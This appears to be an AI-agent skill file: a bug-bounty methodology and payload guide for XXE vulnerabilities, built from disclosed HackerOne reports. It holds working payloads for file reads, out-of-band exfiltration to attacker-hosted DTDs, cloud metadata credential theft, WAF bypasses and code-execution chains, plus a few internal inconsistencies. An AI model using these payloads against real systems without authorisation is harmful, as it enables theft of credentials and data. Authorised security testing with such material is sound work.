---
name: xxe
description: >-
  Hunting skill for xxe vulnerabilities. Built from 10 public bug bounty reports including SVG-upload XXE,
  Office-doc (PPTX/DOCX) XXE, SOAP XXE, SAML AssertionConsumer XXE, blind OOB XXE via DTD callback,
  parameter-entity XXE, XXE-to-LFI, XXE-to-SSRF, and XXE-to-RCE chains (Adobe Commerce CosmicSting
  CVE-2024-34102). Use when hunting XXE on any target — emphasis on OOB-Or-It-Didn't-Happen Gate for blind
  cases. Combined with the HackerOne field guide (real disclosed-report data: where it pays, quick wins,
  payload banks). Hunt XXE and XML parser flaws. Use when testing SOAP, SAML, SVG, DOCX/XLSX, and XML
  uploads. Backed by 64 disclosed HackerOne reports.
---

# XXE — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# XML External Entity (XXE) — HackerOne field guide

Built from **64** publicly disclosed HackerOne reports (2015–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **64** · paid: **11**
- Median bounty **$1,000** · p90 **$2,500** · max **$6,000** · total **$17,600**
- Median upvotes **24**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Mail.ru | 9 | $8,800 | 451 |
| Pornhub | 2 | $2,500 | 228 |
| Open-Xchange | 1 | $2,000 | 86 |
| GitHub Security Lab | 2 | $1,800 | 10 |
| Rockstar Games | 1 | $1,500 | 79 |
| Uber | 2 | $500 | 67 |
| VK.com | 1 | $500 | 18 |
| Informatica | 8 | $0 | 275 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`xml` `soap` `saml` `svg` `docx` `xlsx` `import` `feed` `rss`

## Tools

`Burp` · `xxe-exploit` · `interactsh` · `nuclei`

## Escalation chains

- XXE -> file read -> creds.
- XXE -> SSRF -> metadata.
- SAML wrapping -> admin.

## Related

- `ssrf` (337 reports)
- `rce` (1,399 reports)
- `deserialization` (93 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## Crown Jewel Targets

XXE is a critical-severity vulnerability that consistently pays at the top of bug bounty scales ($5,000–$30,000+) due to its direct path to sensitive data exfiltration and SSRF. Highest-value targets:

- **Large enterprise platforms** with XML-heavy backend integrations (finance, logistics, ride-sharing APIs)
- **Domains with file-read capability** — `/etc/passwd`, `/etc/shadow`, internal config files, AWS metadata endpoints
- **Subdomains sharing backend infrastructure** — one XXE endpoint can pivot to internal services across dozens of domains (as demonstrated by 26+ Uber domains via a single entry point)
- **API gateways** accepting XML content types — especially REST APIs that silently accept `Content-Type: application/xml`
- **File upload features** — SVG, DOCX, XLSX, PDF, PPTX parsers on the server side
- **SAML/SSO endpoints** — SAML assertions are XML-based and frequently vulnerable
- **Office/document processing services** — any feature that converts or processes user-supplied documents

---

## Attack Surface Signals

### URL Patterns
```
/api/v*/xml
/upload
/import
/parse
/convert
/saml/acs
/sso/saml
/feed
/rss
/sitemap
/webdav
/soap/*
/wsdl
/service.asmx
/xmlrpc
/graphql (multipart with XML)
```

### Request/Response Headers
```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: multipart/form-data  ← check file upload fields
Accept: application/xml
X-Content-Type-Options: (absent — good sign of loose parsing)
```

### JavaScript Patterns (source recon)
```javascript
// Look for in JS bundles
XMLSerializer
DOMParser
parseFromString
new ActiveXObject("Microsoft.XMLDOM")
$.parseXML(
xml2js
libxmljs
lxml
```

### Tech Stack Signals
- **Java stacks**: Spring, Struts, JAX-WS — default XML parsers (SAX, DOM) are XXE-vulnerable without explicit hardening
- **PHP**: `simplexml_load_string()`, `DOMDocument::loadXML()` — vulnerable by default pre-PHP 8
- **Python**: `lxml`, `xml.etree` (safe by default), `xml.sax` (unsafe)
- **Ruby**: `Nokogiri` older versions, `REXML`
- **Node.js**: `xml2js`, `libxmljs`, `fast-xml-parser` (older versions)
- **WSDL/SOAP services**: Always test — legacy XML parsing virtually guaranteed
- **File parsers**: Apache POI (Java), python-docx, LibreOffice integrations

---

## Step-by-Step Hunting Methodology

1. **Map every XML entry point** — Use Burp Suite passive scanner to flag all requests/responses with XML content types. Also intercept JSON endpoints and manually swap `Content-Type` to `application/xml` with equivalent XML body.

2. **Identify file upload features** — Upload SVG, DOCX, XLSX, and observe if the server processes/renders content. These are often XML under the hood.

3. **Attempt inline XXE (classic file read)** — Replace the XML body with a basic entity test payload targeting `/etc/passwd` or `C:\Windows\win.ini`. Observe if the value is reflected in the response.

4. **If no reflection, pivot to Blind OOB** — Set up an OOB listener (Burp Collaborator, interactsh, or a self-hosted netcat server). Inject an external entity pointing to your callback URL. Confirm DNS/HTTP hit to validate the parser is making outbound connections.

5. **Escalate Blind OOB to file exfiltration** — Use a two-stage payload: first entity loads local file, second entity sends it OOB via HTTP parameter or DNS exfiltration.

6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://169.254.169.254/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.

7. **Test all subdomains sharing the same backend** — If one subdomain is vulnerable, enumerate and test all others systematically. Shared backend infrastructure means shared vulnerability.

8. **Test parameter-level injection** — Some endpoints parse only specific XML nodes. Inject entities into every element value, attribute value, and even element names.

9. **Test for error-based exfiltration** — If OOB is blocked, trigger XML parsing errors that include file content in the error message returned to the client.

10. **Document the full impact chain** — Demonstrate: file read → SSRF → internal service access → note which internal domains/IPs are reachable.

---

## Common Root Causes

1. **Default parser configurations** — Java's `DocumentBuilderFactory`, PHP's `DOMDocument`, and Python's `lxml` all support external entities by default. Developers use them without reading the security docs.

2. **Framework upgrades without security re-review** — Older versions of Spring, Struts, and similar frameworks enabled XXE by default; developers didn't re-audit XML handling when libraries changed.

3. **Hidden XML consumption** — Developers accept JSON at the API layer but convert to XML internally, or use libraries (Apache POI, python-docx) to process uploads without realizing those formats are XML containers.

4. **Copy-paste code from StackOverflow** — XML parsing examples online rarely include entity disabling. Developers copy minimal working examples straight into production.

5. **SAML/SSO library misconfigurations** — SSO integrations often delegate XML parsing to third-party libraries with XXE enabled; developers assume "library handles security."

6. **Testing gaps on non-primary content types** — QA tests JSON APIs extensively; XML code paths receive minimal security testing because they're secondary or legacy.

7. **Microservice XML messaging** — Internal service-to-service communication uses XML (SOAP, custom schemas) and is treated as a "trusted internal" concern, bypassing security review.

---

## Parser-ecosystem vulnerability matrix

XXE classic payloads (`<!ENTITY xxe SYSTEM "file://...">`) are not universally exploitable in 2026. Most mainstream language ecosystems have hardened their default XML parsers since 2018-2024. Fingerprint the target stack BEFORE investing time in XXE — sometimes the parser is already safe and the bug class doesn't apply.

| Ecosystem / parser | Default behavior on SYSTEM entity | Vulnerable by default? |
|---|---|---|
| Java SAX / DOM (`XMLInputFactory` without disabling external entities) | Expands SYSTEM file:// | **YES** |
| Java JAXB / JAX-WS (older Spring versions) | Expands | **YES** |
| PHP `DOMDocument` with `LIBXML_NOENT` flag | Expands SYSTEM | **YES** |
| PHP `simplexml_load_*` with `LIBXML_NOENT` | Expands | **YES** |
| .NET `XmlDocument` with `XmlResolver` explicitly set | Expands | **YES** |
| .NET `XmlReader` with `DtdProcessing=Parse` + `XmlResolver` explicitly set | Expands | **YES** (default since .NET 4.5.2 is `DtdProcessing.Prohibit`, which THROWS on any DOCTYPE — modern default is safe) |
| Python `xml.etree.ElementTree` ≥ 3.7.1 | SYSTEM disabled | NO |
| Python `lxml` (verified 6.x; likely ≥ 5.x) | Drops SYSTEM file content even with `resolve_entities=True`; may still issue network fetches when `no_network=False` | NO for file read (verified locally on 6.1.0 — see `docs/verification/phase2g-saml-mfa-xxe.md`) |
| Python `xml.dom.minidom` | Default safe in current versions | NO |
| Python `defusedxml.lxml` | Disabled | NO |
| Ruby Nokogiri default | Disabled | NO |
| Ruby Nokogiri with `Nokogiri::XML::ParseOptions::DTDLOAD` | Expands | **YES** |
| Apache Struts (older) | Often expands | **YES** |
| Embedded IoT / industrial XML processors (firmware) | Frequently vulnerable | **YES** |
| Microsoft Office OOXML processors that re-parse user content | Vulnerable in some legacy paths | **YES** |

**Fingerprint signals to look for:**

- `Server: Apache Tomcat`, `X-Powered-By: Servlet` → Java backend → **likely YES**
- `X-Powered-By: PHP/...` + endpoint that ingests XML → **likely YES** if app uses `DOMDocument`
- `Server: Microsoft-IIS` with `.aspx` and XML SOAP → **likely YES** on legacy code
- Server says nothing identifiable + endpoint accepts XML → **probe with `&hello;` first**; if the inline entity expands, escalate to SYSTEM. If the inline entity also fails to expand, the parser may be hardened — pivot.

**Pre-Severity Gate:** before claiming XXE on a candidate endpoint, run the inline-entity probe (`<!ENTITY hello "world!">` then `&hello;` in a node). If `hello!` does NOT echo back, parser-level entity expansion is disabled and SYSTEM file:// won't work either. Don't waste cycles on a hardened parser.

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   - Can you show the contents of `/etc/passwd` or `win.ini` in the response? OR can you demonstrate a confirmed OOB callback with a file's contents transmitted to your server? OR can you reach an internal SSRF endpoint (metadata, internal admin)?

2. **What does the victim LOSE?**
   - Specific sensitive data must be identified: internal credentials, AWS IAM keys, application config files with DB passwords, PII, or internal network topology. "Parser made a DNS request" alone is insufficient — escalate to demonstrate actual data exposure or internal access.

3. **Can it be reproduced in 10 minutes from scratch?**
   - You must have a single `curl` command or Burp repeater request that a triage engineer can run against the live target and see the impact within 10 minutes, with zero ambiguity about the vulnerable parameter and endpoint.

---

## Real Impact Examples

### Scenario A: Single Endpoint → 26 Domains Compromised (Uber-scale)
A tester discovered an XML parsing endpoint on one Uber subdomain. The backend processed XML using a vulnerable parser, and the server made outbound HTTP requests to attacker-controlled infrastructure (blind OOB). Because the vulnerable XML processing service was a shared internal microservice, the same vulnerability was reachable through 26+ different public-facing domains — all sharing the backend. A single payload could read `/etc/passwd`, internal config files, and reach AWS metadata endpoints, effectively giving access to credentials reusable across the entire infrastructure.

**Business impact**: Full internal service compromise across the majority of the production domain fleet; potential for credential theft and lateral movement.

### Scenario B: Document Upload → Local File Read on Twitter-scale Platform
An attacker uploaded a crafted XML-based document (e.g., SVG or Office format) to a document processing feature on a major social platform. The server-side parser processed the embedded DTD and external entity references, returning local file contents in the parsed output or error messages. The attacker could read application config files containing database connection strings, internal API keys, and potentially private user data stored on the same filesystem.

**Business impact**: Exposure of production secrets (database credentials, API keys) via a feature intended for harmless file uploads; no authentication bypass required beyond a standard user account.

### Scenario C: JSON API → Hidden XML Parser → SSRF to Internal Services
A REST API endpoint nominally accepting JSON was found to also parse requests submitted as `application/xml`. The underlying service converted XML to an internal format using an unpatched Java `DocumentBuilderFactory`. By injecting a SYSTEM entity pointing at `http://10.0.0.x` address ranges, the tester could probe internal services, reach an unauthenticated internal admin panel, and retrieve AWS instance metadata including temporary IAM credentials — all through a single API call requiring only a valid session token.

**Business impact**: Complete AWS credential compromise from a single authenticated API call, enabling privilege escalation from application-level user to cloud infrastructure administrator.

---

## Disclosed Report Citations (Backfill +6 — 2016-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Three cases (#7, #9, #10) are OOB-required (blind) — they cross-reference the `ssrf` OOB-Or-It-Didn't-Happen Gate and cannot be claimed without a Collaborator/interactsh callback.

5. **Mail.ru — Pulse RSS/Atom feed XXE (file read)** ([H1 #505947](https://hackerone.com/reports/505947))
    - Subclass: direct file-read XXE (in-band)
    - Payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` inside RSS feed body → `<title>&xxe;</title>` reflected in response
    - Root cause: pulse.mail.ru RSS/Atom ingestion called an XML parser with `external general entities` enabled
    - Year: 2019 — **$6,000**

6. **Twitter — sms-be-vip.twitter.com SOAP/SXMP servlet XXE** ([H1 #248668](https://hackerone.com/reports/248668))
    - Subclass: SOAP XXE (cloudhopper SXMP servlet) — confirmed via HTTP callback **and** reflected file read
    - Payload: `<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker/x.dtd"> %ext;]>` chained in SXMP request body
    - Root cause: Cloudhopper SXMP servlet parsed inbound XML with default JAXP settings (entities resolved)
    - Year: 2017 — **$10,080** (classic SOAP-XXE reference case)

7. **Zivver — SVG profile-picture upload XXE → SSRF** ([H1 #897244](https://hackerone.com/reports/897244))
    - Subclass: SVG-upload XXE, OOB-confirmed, chains to SSRF
    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><text>&xxe;</text>`
    - Root cause: server thumbnailed uploaded SVG with an XML parser that resolved external entities; no entity-resolver shutdown
    - Year: 2020 — Zivver had no paid program at the time

8. **Open-Xchange — Blind XXE via PowerPoint (.pptx) import** ([H1 #334488](https://hackerone.com/reports/334488))
    - Subclass: Office-doc XXE (PPTX = ZIP of XML parts), OOB-required
    - Payload: modify `ppt/slides/slide1.xml` inside the .pptx ZIP to include `<!DOCTYPE x [<!ENTITY % a SYSTEM "http://attacker/d.dtd"> %a;]>`; external DTD chains parameter entities to exfil `file:///etc/passwd` over HTTP
    - Root cause: PowerPoint parser pre-rendered the XML parts of the OOXML container before disabling entity resolution
    - Year: 2018 — **$2,000**

9. **Uber — Blind OOB XXE on ubermovement.com** ([H1 #154096](https://hackerone.com/reports/154096))
    - Subclass: blind OOB XXE (third-party vendor product), OOB-required
    - Payload: `<!DOCTYPE r [<!ENTITY ping SYSTEM "http://attacker.example/">]><search><q>&ping;</q></search>`
    - Root cause: generic XML endpoint in Movement's vendor stack accepted XML and resolved system entities; no data exfil possible (sandboxed), only blind ping
    - Year: 2016 — **$500**

10. **Adobe Commerce / Magento — "CosmicSting" CVE-2024-34102** ([Assetnote writeup](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102))
    - Subclass: XXE-to-RCE (nested deserialization → XXE in Laminas request body) — modern, exploited in the wild
    - Payload: REST API JSON request whose nested `simplexml_load_string()` reaches `<!DOCTYPE r [<!ENTITY % d SYSTEM "http://attacker/x.dtd"> %d;]>`; external DTD reads `app/etc/env.php` (admin crypt-key) and POSTs it back; key forges admin token → RCE
    - Root cause: `Laminas\Http\PhpEnvironment\Request` deserialized `simplexml_load_string` on attacker-controlled body without `LIBXML_NOENT` protections
    - Year: 2024 — Adobe HackerOne bounty paid, CVSS 9.8

---

## Related Skills & Chains

- **`ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
- **`file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
- **`rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
- **`sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
- **`security-arsenal`** — Reach for the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indirection that makes blind XXE work), `php://filter/convert.base64-encode/resource=` for binary-safe read, XInclude (`<xi:include href=...>`) when DOCTYPE is blocked, billion-laughs/quadratic-blowup for DoS, and the `jar://` / `netdoc://` Java-specific wrappers.
- **`triage-validation`** — Apply the Reproducibility + Pre-Severity Gates. An XXE that only triggers an OOB DNS callback with NO data exfil is Low/Medium (information disclosure of "this parser fetches entities"), not Critical. Critical needs proof of file read or internal HTTP — show the actual `/etc/passwd` content or the IMDS JSON response in the report.

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, file types to look
- Map every XML entry point: `/api/v*/xml`, `/upload`, `/import`, `/parse`, `/convert`, `/saml/acs`, `/sso/saml`, `/feed`, `/rss`, `/soap/*`, `/wsdl`, `/service.asmx`, `/xmlrpc`.
- Test JSON endpoints by swapping `Content-Type` to `application/xml` / `text/xml` with an equivalent XML body — hidden XML parsers are a recurring source of high-value findings.
- File-upload surfaces that are XML inside a container: SVG, DOCX, XLSX, PPTX, ODT, GPX, KML, `.xml` configs, SOAP attachments, and PDFs (iText CVE-2017-9096, 2025 writeups).
- Office-doc specifics: modify `word/document.xml`, `ppt/slides/slide1.xml`, or `xl/worksheets/sheet1.xml` inside the ZIP; an XLSX needs all five boilerplate parts (`[Content_Types].xml`, `.rels`, `workbook.xml`, `workbook.xml.rels`, `sheet1.xml`) or the parser rejects it before entity processing.
- Hidden attack surface per PortSwigger: XInclude (`<xi:include href=...>`) when `DOCTYPE` is blocked, file-upload XXE, and `Content-Type`-converted XXE.
- Error-message channels matter as much as reflection: verbose Java/JDOM/Xerces, Spring, and `SAML exception:` / `Error creating JDOM document from XML string:` strings turn parser errors into an exfiltration channel.
- WAF signal: Imperva and others blocking the literal word `DOCTYPE` anywhere in a POST body — confirm the block, then look for a parser path where the DTD is inside a ZIP/XML part rather than the raw body.
- 2025-2026 real targets: Akamai CloudTest CVE-2025-49493 (SOAP/WSDL, Java 1.8), NASA unauth SAML XXE (Bugcrowd P1, 2025), ArubaOS 8.13.2.0 pre-auth XXE on port 32000, Adobe Commerce CosmicSting CVE-2024-34102.

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- Run the inline-entity gate first: `<!ENTITY hello "world!">` then `&hello;`. If `world!` does not echo, entity expansion is disabled and SYSTEM file:// will not work — pivot to OOB/SSRF or a different endpoint.
- Classic in-band read: `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` then `&xxe;` in a node; replace with `file:///etc/hostname` or `C:\Windows\win.ini` as controls.
- Binary-safe read: `php://filter/convert.base64-encode/resource=/path/to/file` — raw `<?php ... ?>` is parsed/swallowed and returns blank.
- Blind OOB detection with regular entity: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<collab>/p"> ]>` + `&xxe;`. If regular entities are filtered, use a parameter entity: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<collab>/p"> %xxe; ]>`.
- Full OOB exfil with an external DTD hosted by you: `<!ENTITY % file SYSTEM "file:///etc/passwd">` + `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<collab>/?x=%file;'>">` + `%eval; %exfil;`. Newlines break URL validation — target `/etc/hostname` or switch to FTP.
- Error-based exfil with no egress (UltraRed 2026 AWS-credential chain): point the exfil entity at a nonexistent path `file:///%file;` so Xerces embeds the file contents in its exception text. `%file` can be `http://169.254.169.254/...` — the IMDS JSON then appears verbatim in the response.
- Error-based via a local DTD when OOB is fully blocked: define `%local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"`, redefine an existing entity from that DTD with the error chain, then `%local_dtd;`. Enumerate candidate local DTDs by loading them and watching for "file not found".
- SSRF pivot through the parser: `<!ENTITY xxe SYSTEM "http://10.0.0.1/">` — reflection gives two-way interaction, absence gives blind SSRF. Port-scan localhost by varying the port and watching for non-empty responses.
- `file://` silently returns empty for files containing `<`, `>`, or `&` — the entity expansion breaks the parse. Use base64 filters or a different target file.
- Nested-deserialization XXE (CosmicSting): a REST JSON body whose nested value reaches `simplexml_load_string()` — read `app/etc/env.php` (admin crypt key) → forge admin token → RCE.

### C. Validation / proof bar — how to confirm and avoid false positives
- A lone Collaborator DNS hit proves the parser fetches external entities; it is Informational/Low on its own. Escalate to actual file contents, a metadata JSON response, or internal HTTP access before claiming Critical.
- A blank reflection is usually a parse failure (illegal characters in the entity), not a missing file — retry with `/etc/hostname` or a base64 filter.
- For in-band reads, require a fingerprintable marker: `root:x:0:0:` in `/etc/passwd`, or base64 that decodes to recognizable source. Truncated base64 that still decodes is acceptable — report exactly what was recovered.
- Error-based reads must show the actual file content in the exception text, not just "file not found"; repeat with two different files to prove the channel is data-dependent.
- Distinguish parser hardening from a filter: if inline `&hello;` fails, the parser is hardened; if it succeeds but `SYSTEM` is blocked, an application filter is likely and encoding/entity tricks may work.
- Confirm OOB interactions are unique per sink by using a distinct Collaborator subdomain per parameter; delayed callbacks require polling for 30-120s.
- XInclude is a separate primitive — if `DOCTYPE` is rejected, try `<xi:include href="file:///etc/passwd" parse="text"/>` before concluding no XXE.
- 10-minute reproducibility: a single curl/Burp request that returns real file content or a confirmed internal HTTP response. A stack trace alone is not sufficient impact for a high severity.

**Entity-mechanics cheat sheet (why each payload works):**
- General entity: declared `<!ENTITY name "value">`, referenced `&name;` — usable in document content.
- Parameter entity: declared `<!ENTITY % name "value">`, referenced `%name;` — usable only inside the DTD; the `%` prefix is what makes blind OOB work.
- External entity: `SYSTEM "URL"` — the URL can be `file://`, `http://`, `ftp://`, `gopher://` (libxml2), `jar://`/`netdoc://` (Java), `expect://` (PHP if enabled).
- Nested parameter-entity references are forbidden inside an *internal* DTD subset — this is why the exfil chain must live in an externally hosted DTD (or be repurposed from a local one).
- The `&#x25;` hex escape is required to write a literal `%` inside an entity value without triggering a parse error.
- XInclude works without any DOCTYPE: `<xi:include href="file:///etc/passwd" parse="text"/>` with `xmlns:xi="http://www.w3.org/2001/XInclude"`.

**High-value target files to aim at:**
- `/etc/passwd`, `/etc/hostname`, `/etc/hosts` — reliable proof-of-read markers.
- `app/etc/env.php` (Magento crypt key), `web.config` (ASP.NET machineKey), `.env`, `config/database.php`, `wp-config.php`.
- `~/.aws/credentials`, `/proc/self/environ`, `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`.
- Windows: `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`.

**Bypass notes for filtered/blocked XXE:**
- WAF blocks `DOCTYPE`: place the entity declaration inside a nested XML part of DOCX/XLSX (the WAF sees only the multipart wrapper), or use XInclude.
- Application strips `<!ENTITY`: try parameter-entity form, external DTD reference only (`<!ENTITY % xxe SYSTEM "http://<collab>/d.dtd"> %xxe;`), and UTF-16/UTF-7 encoded bodies.
- Egress blocked: error-based via local DTD repurposing, or repurpose an existing local DTD that the app already loads.
- DNS label limit (253 chars) kills large DNS exfil — use HTTP query strings or error-based reads instead.
- Multiline files break URL-based exfil — use `php://filter/convert.base64-encode/resource=` or target single-line files.
- Java `jar://` and `netdoc://` stream wrappers can substitute for `file://` on some JDKs when file reads are filtered; `expect://` on PHP can turn an XXE into direct command execution when the extension is loaded.
- Always test all data nodes individually: a real-world XML request often has many values, and only one of them may be wired into the reflected response or error path.

### D. Sources — numbered list of URLs you actually fetched
1. https://portswigger.net/web-security/xxe/blind
2. https://ultrared.ai/blog/xxe-aws-credential-theft
